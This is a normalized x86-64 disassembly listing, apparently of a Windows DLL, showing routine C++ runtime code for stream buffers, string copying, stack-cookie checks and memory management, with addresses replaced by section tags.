xor rcx rsp
call sub_180018450
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x80 ] rbp
mov [ rsp + 0x40 ] r13
xor r13d r13d
lea rbp [ rcx + 0x28 ]
nop [ rax + rax ] ax
movzx edx [ rbx ]
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x24 ]
mov r9 rbp
mov [ rsp + 0x20 ] r13d
call sub_180016f50
movzx edx [ rsp + 0x24 ]
movzx ecx r12b
cmp eax 0x1
cmovne edx ecx
add rbx 0x2
inc rdi
mov [ rdi - 0x1 ] dl
cmp rbx rsi
jne r-xdata
mov r13 [ rsp + 0x40 ]
mov rbp [ rsp + 0x80 ]
sub_1800037a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x18 ]
call sub_180018b3c
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_180018b3c
sub_1800037f0
push rbp
mov rbp rsp
sub rsp 0x60
mov eax [ rcx + 0x14 ]
and edx 0x17
and eax edx
mov [ rcx + 0x10 ] edx
je r-xdata
add rsp 0x60
pop rbp
retn
test r8b r8b
je r-xdata
mov [ rsp + 0x78 ] rbx
mov [ rbp - 0x40 ] 0x1
test al 0x4
je r-xdata
xor edx edx
xor ecx ecx
call sub_180019410
int3
test al 0x2
je r-xdata
call sub_180017098
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180018524
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_180019410
int3
call sub_180017098
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180018524
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_180019410
int3
call sub_180017098
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_180018524
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_180019410
int3
sub_180003910
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x40 ]
mov rbx rdx
lea rcx [ rsp + 0x30 ]
mov rdi [ rax ]
mov [ rdx ] rdi
xor edx edx
call sub_18001775c
mov rax [ rdi + 0x8 ]
cmp rax 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_18001778c
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
inc rax
mov [ rdi + 0x8 ] rax
sub_180003960
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor esi esi
xor r8d r8d
xor edx edx
mov rbx rcx
mov [ rcx + 0x18 ] 0x201
mov [ rcx + 0x20 ] 0x6
mov [ rcx + 0x40 ] rsi
mov [ rcx + 0x8 ] rsi
mov [ rcx + 0x14 ] esi
mov [ rcx + 0x28 ] rsi
mov [ rcx + 0x30 ] rsi
mov [ rcx + 0x38 ] rsi
call sub_1800037f0
lea ecx [ rsi + 0x8 ]
call sub_180018a08
mov rdi rax
test rax rax
je r-xdata
mov [ rbx + 0x40 ] rsi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call sub_1800175d8
mov [ rdi ] rax
call sub_180017388
lea rcx [ rsp + 0x30 ]
xor edx edx
mov rsi rax
call sub_18001775c
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_18001778c
mov [ rbx + 0x40 ] rdi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
inc rcx
mov [ rsi + 0x8 ] rcx
sub_180003a30
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
lea rax [ r--data ]
mov [ rdi ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_180003a80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_180003ac0
mov rax rsp
push rbp
lea rbp [ rax - 0xf8 ]
sub rsp 0x1f0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xe0 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] rdi
mov [ rbp + 0x40 ] di
lea rcx [ rsp + 0x40 ]
call sub_180004310
nop
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x40 ]
call sub_180005550
mov r11 rax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
test [ rcx + 0x10 ] 0x6
cmovne rcx rdi
test rcx rcx
je r-xdata
lea rcx [ rbp - 0x28 ]
call sub_180004400
lea r11 [ r--data ]
mov [ rbp - 0x28 ] r11
lea rcx [ rbp - 0x28 ]
call sub_180017208
nop
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
nop [ rax ] eax
mov rax rbx
mov rcx [ rbp + 0xe0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x1f0 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x40 ]
call j_sub_180018b3c
lea rdx [ rbp + 0x40 ]
mov rcx rbx
call sub_180004220
lea rax [ rbp + 0x40 ]
cmp rdx 0x8
cmovae rax rcx
mov r9 [ rbp + 0x50 ]
cmp [ rax + r9 * 2 - 0x2 ] 0x22
jne r-xdata
lea rax [ rbp + 0x40 ]
mov rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x58 ]
cmp rdx 0x8
cmovae rax rcx
cmp [ rax ] 0x22
jne r-xdata
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea rdx [ rbp + 0x90 ]
lea rcx [ rsp + 0x40 ]
call sub_180005780
or r9 0xffffffffffffffff
lea r8d [ r9 + 0x2 ]
lea rdx [ rbp + 0xb8 ]
lea rcx [ rbp + 0x40 ]
call sub_180001f80
nop
lea r8 [ rbp + 0x90 ]
mov rdx rax
lea rcx [ rbp + 0x68 ]
call sub_1800054f0
nop
mov rdx rax
mov rcx rbx
call sub_1800025c0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
add r9 0xfffffffffffffffe
mov r8d 0x1
lea rdx [ rbp + 0x68 ]
lea rcx [ rbp + 0x40 ]
call sub_180001f80
nop
mov rdx rax
mov rcx rbx
call sub_1800025c0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0xd0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_180018b3c
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x40 ]
call sub_180005550
mov r11 rax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
test [ rcx + 0x10 ] 0x6
cmovne rcx rdi
test rcx rcx
jne r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_180018b3c
jmp r-xdata
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb8 ]
call j_sub_180018b3c
nop
mov rcx [ rbp + 0x90 ]
call j_sub_180018b3c
jmp r-xdata
sub_180003da0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
xor edi edi
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_1800037f0
or edx 0x4
sub_180003e40
mov [ rsp + 0x20 ] rbx
push rsi
sub rsp 0x20
mov rbx [ rcx + 0x68 ]
lea rax [ r--data ]
mov rsi rcx
mov [ rcx ] rax
test rbx rbx
je r-xdata
lea rcx [ rsi + 0x8 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rsi
jmp sub_1800177dc
mov [ rsp + 0x40 ] rdi
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_180018b3c
mov rdi [ rsp + 0x40 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rbp
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebp ebp
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbp
cmove rbp rdi
call sub_18001778c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_180003ee0
push rbx
sub rsp 0x20
mov rax [ rcx + 0x40 ]
mov rbx rcx
mov rcx [ rax ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x38 ]
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x1
jle r-xdata
mov rcx [ rbx + 0x40 ]
cmp [ rcx ] 0x0
je r-xdata
movzx eax cx
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
dec [ rax ]
mov rax [ rbx + 0x40 ]
mov rcx [ rax ]
add rcx 0x2
mov [ rax ] rcx
movzx eax [ rcx ]
add rsp 0x20
pop rbx
retn
mov rax [ rbx ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp [ rax + 0x30 ]
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rcx ]
movzx eax [ rax ]
add rsp 0x20
pop rbx
retn
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_180003fc0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
call [ rax + 0x30 ]
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov rax [ rbx + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
add rsp 0x20
pop rbx
retn
movzx eax cx
add rsp 0x20
pop rbx
retn
sub_180004000
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
xor ebp ebp
mov rdi r8
mov rsi rdx
mov r12 rcx
test r8 r8
jle r-xdata
mov rax rbp
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x50 ] r14
mov r14d 0xffff
mov [ rsp + 0x40 ] rbx
mov rax [ r12 ]
mov rcx r12
call [ rax + 0x38 ]
cmp r14w ax
je r-xdata
mov rdx [ r12 + 0x40 ]
cmp rdi rax
mov rcx rsi
mov rdx [ rdx ]
cmovl r13 rdi
lea rbx [ r13 + r13 ]
mov r8 rbx
call sub_180018670
mov rax [ r12 + 0x58 ]
add rsi rbx
sub [ rax ] r13d
mov rcx [ r12 + 0x40 ]
movsxd rax r13d
add rax rax
add rbp r13
sub rdi r13
add [ rcx ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov r14 [ rsp + 0x50 ]
mov rax rbp
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov [ rsi ] ax
add rsi 0x2
inc rbp
dec rdi
test rdi rdi
jg r-xdata
mov rcx r12
call sub_180005000
mov r13 rax
test rax rax
jle r-xdata
sub_1800040e0
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
mov r13 rcx
test r8 r8
jle r-xdata
mov rax rsi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
retn
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x50 ] r14
mov r14d 0xffff
mov [ rsp + 0x40 ] rbx
mov r8 [ r13 ]
movzx edx [ rbp ]
mov rcx r13
call [ r8 + 0x18 ]
cmp r14w ax
je r-xdata
mov rcx [ r13 + 0x48 ]
cmp rdi rax
mov rdx rbp
mov rcx [ rcx ]
cmovl r12 rdi
lea rbx [ r12 + r12 ]
mov r8 rbx
call sub_180018670
mov rax [ r13 + 0x60 ]
add rbp rbx
sub [ rax ] r12d
mov rcx [ r13 + 0x48 ]
movsxd rax r12d
add rax rax
add rsi r12
sub rdi r12
add [ rcx ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov r14 [ rsp + 0x50 ]
mov rax rsi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
retn
add rbp 0x2
inc rsi
dec rdi
test rdi rdi
jg r-xdata
mov rcx r13
call sub_180005020
mov r12 rax
test rax rax
jle r-xdata
sub_180004220
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180002920
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_180002260
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180002920
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180002260
nop
sub_180004310
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rdi rdx
mov rsi rcx
mov [ rsp + 0x58 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
lea rax [ r--data ]
mov [ rcx + 0x98 ] rax
mov [ rsp + 0x58 ] 0x1
lea rbx [ rcx + 0x18 ]
mov rdx rbx
call sub_180005040
nop
mov rax [ rsi + 0x10 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rsi + 0x10 ] rax
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rsi ] rax
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rsi ] rax
mov [ rsp + 0x60 ] rbx
mov rcx rbx
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rbx ] rax
mov r8 [ rdi + 0x10 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x70 ] 0x0
mov [ rbx + 0x78 ] 0x0
test r8 r8
je r-xdata
mov rdi [ rdi ]
mov rax rsi
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov rdx rdi
mov rcx rbx
call sub_1800051d0
nop
sub_180004400
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx - 0x98 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x98 ] rax
lea rbx [ rcx - 0x80 ]
lea rax [ r--data ]
mov [ rbx ] rax
test [ rbx + 0x78 ] 0x1
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov [ rbx + 0x70 ] rcx
and [ rbx + 0x78 ] 0xfffffffe
mov rcx rbx
call sub_180003e40
nop
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
mov rax [ rbx - 0x8 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x8 ] rax
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
add rsp 0x30
pop rbx
retn
mov rax [ rbx + 0x20 ]
mov rcx [ rax ]
call j_sub_180018b3c
sub_1800044d0
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x8 ] rax
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
retn
sub_180004510
push rbx
push r12
sub rsp 0x28
test [ rcx + 0x78 ] 0x8
movzx r12d dx
mov rbx rcx
je r-xdata
mov r10d 0xffff
mov [ rsp + 0x40 ] rbp
cmp r10w r12w
jne r-xdata
mov r10 [ rcx + 0x48 ]
mov r8 [ r10 ]
test r8 r8
je r-xdata
mov rdx [ rbx + 0x48 ]
mov r9 [ rdx ]
test r9 r9
je r-xdata
xor ebp ebp
movzx eax bp
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
mov r9 [ rcx + 0x70 ]
cmp r8 r9
jae r-xdata
test [ rbx + 0x78 ] 0x2
je r-xdata
mov r8 [ rbx + 0x60 ]
movsxd rax [ r8 ]
lea rcx [ r9 + rax * 2 ]
cmp r9 rcx
jae r-xdata
mov rax [ rcx + 0x60 ]
movsxd rcx [ rax ]
mov [ r10 ] r9
mov rax [ rbx + 0x60 ]
lea rdx [ r8 + rcx * 2 ]
sub rdx r9
sar rdx 0x1
mov [ rax ] edx
xor ebp ebp
mov [ rsp + 0x50 ] rdi
test r9 r9
jne r-xdata
movzx eax r10w
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
dec [ r8 ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r12w
movzx eax r12w
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
mov rax [ rbx + 0x60 ]
movsxd rdi [ rax ]
mov rax [ rbx + 0x20 ]
add rdi rdi
sub rdi [ rax ]
add rdi r9
sar rdi 0x1
mov edi ebp
jmp r-xdata
test rax rax
je r-xdata
mov eax 0x20
jmp r-xdata
mov rax rdi
shr rax 0x1
cmp rax 0x20
jae r-xdata
movzx eax r10w
mov rdi [ rsp + 0x50 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
nop
mov ecx 0x7fffffff
sub rcx rax
cmp rcx rdi
jae r-xdata
test rax rax
jne r-xdata
shr rax 0x1
jne r-xdata
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
lea r14 [ rax + rdi ]
mov rcx r14
call sub_180002b20
mov rcx [ rbx + 0x20 ]
mov r13 [ rcx ]
mov rsi rax
test rdi rdi
je r-xdata
mov rax [ rbx + 0x28 ]
mov [ rbx + 0x70 ] rsi
lea rcx [ r14 + r14 ]
mov [ rax ] rsi
mov rax [ rbx + 0x48 ]
sar rcx 0x1
mov [ rax ] rsi
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov rax [ rbx + 0x20 ]
test [ rbx + 0x78 ] 0x4
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
je r-xdata
lea r8 [ rdi + rdi ]
mov rdx r13
mov rcx rax
call sub_180018670
test rdi rdi
jne r-xdata
mov [ rax ] rsi
mov rax [ rbx + 0x58 ]
mov [ rax ] 0x1
jmp r-xdata
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
sar rsi 0x1
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x70 ]
sub rax r13
sar rax 0x1
lea rax [ rsi + rax * 2 ]
mov [ rbx + 0x70 ] rax
mov rax [ rbx + 0x48 ]
mov rcx [ rax ]
sub rcx r13
sar rcx 0x1
lea rdx [ rsi + rcx * 2 ]
mov rcx [ rbx + 0x28 ]
mov rax [ rcx ]
sub rax r13
sar rax 0x1
lea rax [ rsi + rax * 2 ]
mov [ rcx ] rax
mov rax [ rbx + 0x48 ]
lea rcx [ r14 + r14 ]
sub rcx rdx
mov [ rax ] rdx
mov rax [ rbx + 0x60 ]
add rcx rsi
sar rcx 0x1
mov [ rax ] ecx
test [ rbx + 0x78 ] 0x4
je r-xdata
test [ rbx + 0x78 ] 0x1
mov r14 [ rsp + 0x20 ]
mov rsi [ rsp + 0x48 ]
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8 [ rax ]
mov rax [ rbx + 0x40 ]
mov rcx [ rax ]
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sub rcx r13
sar rcx 0x1
lea rdx [ rsi + rcx * 2 ]
sub r8 rdx
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
add r8 0x2
sar r8 0x1
mov [ rax ] r8d
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sar rsi 0x1
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x60 ]
or [ rbx + 0x78 ] 0x1
mov r13 [ rsp + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov rdx [ rcx ]
mov rbp [ rsp + 0x40 ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r12w
movzx eax r12w
add rsp 0x28
pop r12
pop rbx
retn
mov rcx r13
call j_sub_180018b3c
sub_1800047d0
mov rax [ rcx + 0x40 ]
mov r9d 0xffff
mov r8 [ rax ]
test r8 r8
je r-xdata
movzx eax r9w
retn
mov rax [ rcx + 0x20 ]
cmp r8 [ rax ]
jbe r-xdata
cmp r9w dx
je r-xdata
mov rax [ rcx + 0x58 ]
inc [ rax ]
mov rax [ rcx + 0x40 ]
add [ rax ] 0xfffffffffffffffe
cmp r9w dx
je r-xdata
cmp dx [ r8 - 0x2 ]
je r-xdata
xor eax eax
retn
mov rax [ rcx + 0x40 ]
mov rcx [ rax ]
movzx eax dx
mov [ rcx ] dx
retn
test [ rcx + 0x78 ] 0x2
jne r-xdata
sub_180004830
sub rsp 0x8
mov r11 [ rcx + 0x40 ]
mov r9 rcx
mov r10 [ r11 ]
test r10 r10
jne r-xdata
mov [ rsp ] rbx
mov rbx [ rcx + 0x58 ]
movsxd rcx [ rbx ]
lea rdx [ r10 + rcx * 2 ]
cmp r10 rdx
jae r-xdata
mov eax 0xffff
add rsp 0x8
retn
test [ r9 + 0x78 ] 0x4
jne r-xdata
movzx eax [ r10 ]
mov rbx [ rsp ]
add rsp 0x8
retn
mov eax 0xffff
mov rbx [ rsp ]
add rsp 0x8
retn
mov rax [ r9 + 0x48 ]
mov rcx [ rax ]
test rcx rcx
je r-xdata
cmp rcx r10
ja r-xdata
cmp [ r9 + 0x70 ] rcx
jae r-xdata
cmp [ r9 + 0x70 ] r10
jbe r-xdata
mov rax [ r9 + 0x70 ]
sub rax [ r11 ]
sar rax 0x1
mov [ rbx ] eax
mov rax [ r9 + 0x40 ]
mov rbx [ rsp ]
mov rcx [ rax ]
movzx eax [ rcx ]
add rsp 0x8
retn
mov [ r9 + 0x70 ] rcx
sub_1800048d0
push rbx
mov r10 r8
mov r8 [ rcx + 0x48 ]
mov rbx rdx
mov rax [ r8 ]
mov r11 rcx
test rax rax
je r-xdata
mov edx [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rdi
test dl 0x1
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
test dl 0x2
je r-xdata
mov rax [ rcx + 0x40 ]
mov rdi [ rax ]
test rdi rdi
je r-xdata
mov [ rcx + 0x70 ] rax
test r10 r10
cmovne r10 [ r--data ]
mov r8 [ r8 ]
test r8 r8
je r-xdata
mov r8 [ r--data ]
cmp r9d 0x2
jne r-xdata
mov rdi [ r--data ]
cmp r9d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
test r9d r9d
je r-xdata
test dl 0x2
jne r-xdata
test r10 r10
js r-xdata
test r9d r9d
cmovne r10 rdi
mov rax [ rcx + 0x20 ]
mov rcx r8
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
test r10 r10
js r-xdata
mov r10 r8
mov rax [ rcx + 0x20 ]
mov rcx rdi
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
mov r10 r8
jmp r-xdata
mov rax [ r11 + 0x20 ]
mov r9 [ rax ]
mov rax [ r11 + 0x70 ]
sub rax r9
sar rax 0x1
cmp r10 rax
jg r-xdata
mov r10 rdi
jmp r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rdi [ rsp + 0x10 ]
xor eax eax
mov [ rbx ] r10
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] eax
mov rax rbx
pop rbx
retn
mov rax [ r11 + 0x58 ]
sub r9 rdi
sar r9 0x1
add r9d r10d
sub [ rax ] r9d
mov rcx [ r11 + 0x40 ]
movsxd rax r9d
add rax rax
add [ rcx ] rax
test dl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
jmp r-xdata
mov r9 [ r11 + 0x48 ]
mov r8 [ r9 ]
test r8 r8
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
